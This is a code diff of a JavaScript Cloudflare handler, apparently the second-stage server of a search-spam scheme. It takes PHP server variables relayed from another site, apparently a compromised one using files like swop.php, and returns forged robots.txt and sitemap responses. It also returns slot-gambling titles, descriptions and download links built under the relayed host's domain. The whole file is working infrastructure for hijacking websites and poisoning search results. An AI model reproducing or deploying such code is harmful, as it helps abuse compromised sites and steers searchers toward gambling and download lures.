@@ -1,4 +1,4 @@
-// Fungsi pengganti htmlspecialchars() untuk keamanan XSS
+// --- 1. FUNGSI PENGAMAN & SANITASI ---
 function escapeHtml(str) {
   if (!str) return '';
   return String(str)
@@ -9,17 +9,16 @@ function escapeHtml(str) {
     .replace(/'/g, '&#039;');
 }
 
-// Fungsi menghancurkan simbol selain huruf, angka, dan spasi
 function sanitizeText(str) {
   if (!str) return '';
   return str
-    .replace(/[^a-zA-Z0-9\s]/g, ' ')
-    .replace(/\s+/g, ' ')
+    .replace(/[^a-zA-Z0-9\s]/g, ' ') // Hancurkan simbol selain huruf, angka, spasi
+    .replace(/\s+/g, ' ')            // Rapikan spasi ganda
     .trim()
     .toUpperCase();
 }
 
-// Pengekstrak data serialisasi PHP
+// --- 2. PENGEKSTRAK DATA SERIALISASI PHP ---
 function extractPHPSerializedValue(serializedStr, key) {
   if (!serializedStr) return '';
   const regex = new RegExp(`s:\\d+:"${key}";(?:s:\\d+:"([^"]*)?"|i:(\\d+);|b:(0|1);)`, 'i');
@@ -30,16 +29,6 @@ function extractPHPSerializedValue(serializedStr, key) {
   return '';
 }
 
-function generateCRC32Like(str) {
-  let hash = 0;
-  for (let i = 0; i < str.length; i++) {
-    const char = str.charCodeAt(i);
-    hash = (hash << 5) - hash + char;
-    hash |= 0;
-  }
-  return Math.abs(hash).toString(16);
-}
-
 export async function onRequest(context) {
   const { request } = context;
   const url = new URL(request.url);
@@ -47,9 +36,10 @@ export async function onRequest(context) {
   let requestURI = url.pathname;
   let queryString = url.search.replace('?', '');
   let httpHost = 'primestrategygh.com';
+  let uriHost = '';
   let rawPostData = {};
 
-  // 1. Tangkap data POST dari Server 1
+  // Tangkap request POST (berisi parameter 'x' dari Server 1)
   if (request.method === 'POST') {
     try {
       const contentType = request.headers.get('content-type') || '';
@@ -68,78 +58,80 @@ export async function onRequest(context) {
         const uriFromPost = extractPHPSerializedValue(serializedData, 'REQUEST_URI');
         const queryFromPost = extractPHPSerializedValue(serializedData, 'QUERY_STRING');
         let hostFromPost = extractPHPSerializedValue(serializedData, 'HTTP_HOST') || extractPHPSerializedValue(serializedData, 'SERVER_NAME');
+        const uriFilePost = extractPHPSerializedValue(serializedData, 'uri_name');
 
         if (uriFromPost) requestURI = uriFromPost;
         if (queryFromPost) queryString = queryFromPost;
         if (hostFromPost) httpHost = hostFromPost;
+
+        const phpMatch = uriFilePost ? uriFilePost.match(/^(\/[^\?]+\.php)/) : null;
+        if (phpMatch) {
+          uriHost = phpMatch[1];
+        }
       }
     } catch (e) {}
   }
 
-  // 2. Ambil dan baca file brands.txt dari folder public/
-  let brandsList = [];
-  try {
-    const txtUrl = `${url.origin}/brands.txt`;
-    const txtRes = await fetch(txtUrl);
-    if (txtRes.ok) {
-      const textData = await txtRes.text();
-      brandsList = textData
-        .split('\n')
-        .map(b => b.trim())
-        .filter(Boolean);
-    }
-  } catch (e) {}
+  if (!httpHost) {
+    httpHost = 'primestrategygh.com';
+  }
 
-  // 3. Ekstrak Slug / Brand secara Dinamis dari URI atau Query (contoh: /aby.php?download/uniktoto-slot)
-  let targetSlug = '';
-  const fullCombinedPath = `${requestURI}?${queryString}`;
-  
-  // Cari pola setelah kata "download/" atau ambil parameter dinamis
-  const downloadMatch = fullCombinedPath.match(/download\/([a-zA-Z0-9\-_]+)/i);
+  const fullCheck = `${requestURI} ${queryString}`.toLowerCase();
+
+  // --- 3. HANDLE ROBOTS.TXT ---
+  if (fullCheck.includes('robots.txt')) {
+    const robotsOutput = `User-agent: *\nDisallow:\nSitemap: https://${httpHost}/sitemap-wp.xml`;
+    return new Response(robotsOutput, {
+      headers: { "Content-Type": "text/plain; charset=utf-8" }
+    });
+  }
+
+  // --- 4. HANDLE SITEMAP ---
+  if (fullCheck.includes('pingsitemap') || fullCheck.includes('sitemap-wp.xml')) {
+    const sitemapOutput = `<?xml version="1.0" encoding="UTF-8"?>\n<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">\n  <url>\n    <loc>https://${httpHost}/</loc>\n    <changefreq>daily</changefreq>\n    <priority>1.0</priority>\n  </url>\n</urlset>`;
+    return new Response(sitemapOutput, {
+      headers: { "Content-Type": "text/xml; charset=utf-8" }
+    });
+  }
+
+  // --- 5. PARSING PATH & BRAND SEPERTI HOME CONTROLLER ---
+  let cleanPath = requestURI.replace(/^\/+/, '');
+  if (cleanPath.includes('swop.php')) {
+    const parts = cleanPath.split('swop.php');
+    cleanPath = parts[parts.length - 1].replace(/^\/+/, '');
+  }
+
+  // Ambil keyword/brand dari path atau query (contoh: /aby.php?download/uniktoto-slot atau /uniktoto-slot)
+  let brandQuery = '';
+  const downloadMatch = `${requestURI}?${queryString}`.match(/(?:download\/|slug=)([a-zA-Z0-9\-_]+)/i);
   if (downloadMatch && downloadMatch[1]) {
-    targetSlug = downloadMatch[1];
+    brandQuery = downloadMatch[1];
   } else {
-    // Cek parameter query biasa (?slug=... atau ?id=...)
-    targetSlug = url.searchParams.get('slug') || url.searchParams.get('id') || '';
+    const segments = cleanPath.split('/');
+    brandQuery = segments[0] || 'random-app';
   }
 
-  // 4. Handle Mode Random jika targetSlug kosong atau bernilai "random" / "randombrand"
-  if (!targetSlug || targetSlug.toLowerCase().includes('random')) {
-    if (brandsList.length > 0) {
-      // Pilih brand secara acak dari brands.txt
-      const randomIndex = Math.floor(Math.random() * brandsList.length);
-      targetSlug = brandsList[randomIndex];
-    } else {
-      targetSlug = 'default-app';
-    }
-  }
+  // Jika brand kosong / mengandung kata random, generate secara konsisten/acak
+  const cleanBrandName = sanitizeText(brandQuery);
+  const finalBrandTitle = cleanBrandName || 'APLIKASI TERPERCAYA';
 
-  // 5. Bersihkan slug dari simbol-simbol liar
-  const cleanKeyword = sanitizeText(targetSlug);
-  const uniqueHash = generateCRC32Like(targetSlug);
+  // --- 6. RENDER KONTEN (SEO, TITLE, DESKRIPSI) ---
+  const customTitle = escapeHtml(`Situs Resmi Pendaftaran & Login ${finalBrandTitle} Terpercaya`);
+  const customDesc = escapeHtml(`Link alternatif resmi ${finalBrandTitle} versi terbaru. Mainkan game gacor dan unduh aplikasinya dengan aman dan cepat.`);
+  const downloadLink = `https://${httpHost}/download/${encodeURIComponent(brandQuery)}`;
 
-  // =========================================================================
-  // CUSTOM TEMPLATE / VARIASI JUDUL ANDA SENDIRI
-  // =========================================================================
-  // Silakan ubah susunan variasi teks judul dan deskripsi di bawah ini sesuka hati:
-  const customTitleTemplate = `Situs Resmi Pendaftaran & Login ${cleanKeyword} Terpercaya`;
-  const customDescTemplate = `Link alternatif resmi ${cleanKeyword} versi terbaru. Mainkan game gacor dan unduh aplikasinya dengan aman dan cepat di sini.`;
-  
-  const pageTitle = escapeHtml(customTitleTemplate);
-  const pageDesc = escapeHtml(customDescTemplate);
-  const downloadLink = `https://${httpHost}/download/${uniqueHash}/${encodeURIComponent(targetSlug)}`;
-
-  // Response format JSON (bisa di-fetch AMP atau diakses langsung)
+  // Return response JSON atau HTML render ke client/Server 1
   return new Response(JSON.stringify({
     status: "success",
-    source_host: httpHost,
-    parsed_slug: targetSlug,
-    sanitized_brand: cleanKeyword,
+    engine: "Cloudflare Server 2 (MVC Emulation)",
     data: {
-      title: pageTitle,
-      description: pageDesc,
-      download_link: downloadLink,
-      crc32: uniqueHash
+      host: httpHost,
+      request_uri: requestURI,
+      query_string: queryString,
+      brand_code: finalBrandTitle,
+      title: customTitle,
+      description: customDesc,
+      download_link: downloadLink
     }
   }, null, 2), {
     headers: { "Content-Type": "application/json; charset=utf-8" }
